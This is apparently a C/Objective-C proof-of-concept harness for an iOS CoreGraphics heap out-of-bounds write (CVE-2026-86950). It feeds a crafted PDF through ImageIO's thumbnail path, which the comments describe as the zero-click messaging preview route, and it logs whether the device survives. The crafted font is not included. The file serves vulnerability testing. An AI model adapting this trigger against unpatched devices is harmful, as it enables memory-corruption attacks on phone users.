/*
 * cg_poc.c — CVE-2026-86950 ("The Great Glyph Grift") trigger harness for iOS.
 *
 * The bug: CoreGraphics' anti-aliased path rasterizer converts a float coordinate to
 * fixed point with aa_double_to_fixed() = (int32_t)(0.5 + 4096.0 * px) and, before
 * iOS 26.7.1, that cast was UNCLAMPED. A crafted font makes the rasterizer's memory
 * estimate too small, and it then writes glyph coverage outside the allocation ->
 * heap OOB write in the rendering path.
 *
 * The trigger is the same one a victim would hit with no interaction: ImageIO's
 * thumbnail path (the WhatsApp / iMessage "preview this attachment" path).
 * ImageIO builds its own internal render context, so no CGContext and no
 * font-smoothing call is needed from us.
 *
 * Upstream PoC: califio/publications MADBugs/CVE-2026-86950/trigger (render.c).
 * We keep their exact call shape and add:
 *   - a report file in our own container (stdout is unreadable on this rig and
 *     NSLog bodies are redacted by the unified log), and
 *   - a "SURVIVED" marker so the difference between "patched" and "crashed" is
 *     unambiguous when we pull the file back.
 *
 * Files: trigger.pdf (and the trigger.ttf it embeds) are copied into the app
 * bundle by build-ios.sh; at runtime we prefer Documents/trigger.pdf if it is
 * there (so the file can be swapped without a rebuild) and fall back to the bundle.
 */
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <CoreFoundation/CoreFoundation.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static FILE *g_report = NULL;

static void report_open(const char *name)
{
	NSString *home = NSHomeDirectory();
	if (!home) return;
	NSString *dir = [home stringByAppendingPathComponent:@"Documents"];
	[[NSFileManager defaultManager] createDirectoryAtPath:dir
	                          withIntermediateDirectories:YES
	                                           attributes:nil
	                                                error:nil];
	NSString *path = [dir stringByAppendingPathComponent:name];
	g_report = fopen([path UTF8String], "a");
	if (g_report) {
		fprintf(g_report, "=== cg_poc run %s ===\n", [[[NSDate date] description] UTF8String]);
		fflush(g_report);
	}
}

static void report_line(const char *s)
{
	if (!g_report) return;
	fprintf(g_report, "%s\n", s);
	fflush(g_report);
	NSLog(@"[cg] %{public}s", s);
}

/* Copy a bundled resource into Documents so it can be replaced on-device. */
static NSString *stage_pdf(void)
{
	NSString *home = NSHomeDirectory();
	NSString *docs = [home stringByAppendingPathComponent:@"Documents"];
	[[NSFileManager defaultManager] createDirectoryAtPath:docs
	                          withIntermediateDirectories:YES
	                                           attributes:nil
	                                                error:nil];
	NSString *dst = [docs stringByAppendingPathComponent:@"trigger.pdf"];
	if ([[NSFileManager defaultManager] fileExistsAtPath:dst]) return dst;

	NSString *bundle = [[NSBundle mainBundle] bundlePath];
	NSString *src = [bundle stringByAppendingPathComponent:@"trigger.pdf"];
	if ([[NSFileManager defaultManager] fileExistsAtPath:src]) {
		[[NSFileManager defaultManager] copyItemAtPath:src toPath:dst error:nil];
		return dst;
	}
	return nil;
}

int main(int argc, char **argv)
{
	@autoreleasepool {
		report_open("cg_report.txt");

		int sz = (argc > 1) ? atoi(argv[1]) : 256;
		NSString *pdf = stage_pdf();
		if (!pdf) {
			report_line("FAIL no trigger.pdf (neither in Documents nor in the bundle)");
			fprintf(stderr, "no trigger.pdf\n");
			return 2;
		}
		report_line([[NSString stringWithFormat:@"pdf=%@ thumb=%d",
		              [pdf lastPathComponent], sz] UTF8String]);

		CFURLRef url = CFURLCreateFromFileSystemRepresentation(
			NULL, (const UInt8 *)[pdf UTF8String], (CFIndex)strlen([pdf UTF8String]), false);
		if (!url) {
			report_line("FAIL CFURLCreate");
			return 3;
		}
		CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
		CFRelease(url);
		if (!src) {
			report_line("FAIL CGImageSourceCreateWithURL (ImageIO rejected the file)");
			return 4;
		}
		report_line("image source created; creating thumbnail (the vulnerable path)");

		CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
		                    kCGImageSourceThumbnailMaxPixelSize };
		CFTypeRef   v[] = { kCFBooleanTrue,
		                    CFNumberCreate(NULL, kCFNumberIntType, &sz) };
		CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k,
			(const void **)v, 2, &kCFTypeDictionaryKeyCallBacks,
			&kCFTypeDictionaryValueCallBacks);

		CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);

		if (img) {
			report_line([[NSString stringWithFormat:@"SURVIVED img=%p %zux%zu",
			              (void *)img, CGImageGetWidth(img), CGImageGetHeight(img)] UTF8String]);
			fprintf(stderr, "survived: %p\n", (void *)img);
			CGImageRelease(img);
		} else {
			report_line("SURVIVED_BUT_NULL img=(nil) - thumbnail came back empty");
		}
		report_line("cg_poc DONE");
		if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
	}
	return 0;
}
